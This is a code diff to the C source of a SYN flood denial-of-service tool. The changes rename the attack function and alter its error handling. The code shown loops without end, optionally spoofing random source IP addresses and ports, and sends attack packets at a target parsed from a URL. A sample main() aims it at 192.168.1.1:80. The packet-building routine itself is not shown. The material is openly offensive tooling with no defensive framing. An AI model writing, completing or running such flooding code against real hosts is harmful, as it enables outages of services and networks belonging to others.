@@ -199,13 +199,13 @@ static int Attack(const pSYNStruct s, const int debug_level)
     return 0;
 }
 
-int SYNFloodAttack(pInput input)
+int SYNFloodAttack_Thread(pInput input)
 {
     // now we start the syn flood attack
     extern void FreeSplitURLBuff(pSplitURLOutput p);
     extern int SplitURL(const char *url, pSplitURLOutput *output);
     extern void FreeRandomIPBuff(char *p);
-    extern int GetRandomIP(char **output);
+    extern char *GetRandomIP(char **output);
     extern int GetRandomPort(int *output);
 
     pSYNStruct s = (pSYNStruct)malloc(sizeof(SYNStruct));
@@ -214,58 +214,55 @@ int SYNFloodAttack(pInput input)
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
     if (SplitURL(input->address, &o) == -1)
     {
-        DisplayError("SYNFloodAttack SplitURL failed");
+        DisplayError("SYNFloodAttack_Thread SplitURL failed");
         return 1;
     }
     if (strlen(o->host) == 0 || o->port == 0)
     {
-        DisplayError("SYNFloodAttack SplitURL not right");
+        DisplayError("SYNFloodAttack_Thread SplitURL not right");
         return 1;
     }
     // init the target ip and port
     s->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
     if (!(s->dst_ip))
     {
-        DisplayError("SYNFloodAttack malloc failed, %s", strerror(errno));
+        DisplayError("SYNFloodAttack_Thread malloc failed, %s", strerror(errno));
         return 1;
     }
     if (!memset(s->dst_ip, 0, SYN_FLOOD_IP_BUFFER_SIZE))
     {
-        DisplayError("SYNFloodAttack memset failed, %s", strerror(errno));
+        DisplayError("SYNFloodAttack_Thread memset failed, %s", strerror(errno));
         return 1;
     }
     if (!strncpy(s->dst_ip, o->host, strlen(o->host)))
     {
-        DisplayError("SYNFloodAttack strncpy failed, %s", strerror(errno));
+        DisplayError("SYNFloodAttack_Thread strncpy failed, %s", strerror(errno));
         return 1;
     }
     s->dst_port = o->port;
     FreeSplitURLBuff(o);
     s->loop = input->each_ip_repeat;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack start sending data...");
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack_Thread start sending data...");
     for (;;)
     {
         // here get the random ip address and port
         if (input->random_sip_address == ENABLE_SIP)
         {
-            if (GetRandomIP(&(s->src_ip)) == -1)
+            if (!GetRandomIP(&(s->src_ip)))
             {
-                DisplayError("SYNFloodAttack GetRandomIP failed");
+                DisplayError("SYNFloodAttack_Thread GetRandomIP failed");
                 return 1;
             }
-            if (GetRandomPort(&(s->src_port)) == -1)
-            {
-                DisplayError("SYNFloodAttack GetRandomPort failed");
-                return 1;
-            }
+            // this function has no failed
+            GetRandomPort(&(s->src_port));
         }
         // here we will use the default ip address and port
         else
         {
             if (!strncpy(s->src_ip, SIP_ADDRESS, strlen(SIP_ADDRESS)))
             {
-                DisplayError("SYNFloodAttack copy SIP_ADDRESS failed, %s", strerror(errno));
+                DisplayError("SYNFloodAttack_Thread copy SIP_ADDRESS failed, %s", strerror(errno));
                 return 1;
             }
             s->src_port = (int)SIP_PORT;
@@ -274,7 +271,7 @@ int SYNFloodAttack(pInput input)
         // rport is random source port
         if (Attack(s, input->debug_level) == -1)
         {
-            DisplayError("SYNFloodAttack Attack failed");
+            DisplayError("SYNFloodAttack_Thread Attack failed");
             return 1;
         }
         FreeRandomIPBuff(s->src_ip);
@@ -291,7 +288,7 @@ int main(void)
     p->random_sip_address = ENABLE_SIP;
     p->each_ip_repeat = 1024;
     strcpy(p->address, "192.168.1.1:80");
-    SYNFloodAttack(p);
+    SYNFloodAttack_Thread(p);
     return 0;
 }
 */
